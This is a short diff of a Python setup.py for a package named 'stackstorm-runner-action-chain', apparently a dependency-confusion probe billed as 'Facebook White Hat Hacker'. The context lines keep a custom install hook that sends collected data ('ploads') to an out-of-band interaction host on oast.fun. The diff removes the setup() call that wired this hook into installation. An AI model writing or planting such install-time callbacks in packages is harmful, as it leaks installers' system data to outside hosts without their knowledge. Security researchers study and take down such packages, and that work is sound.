@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("http://aeknnnsitysuxpmwevwu8f0o55ek42w0f.oast.fun",params = ploads)
 
 
-setup(name='stackstorm-runner-action-chain',
-      version='1.0.0',
-      description='Facebook White Hat Hacker',
-      author='pastaga',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                                            
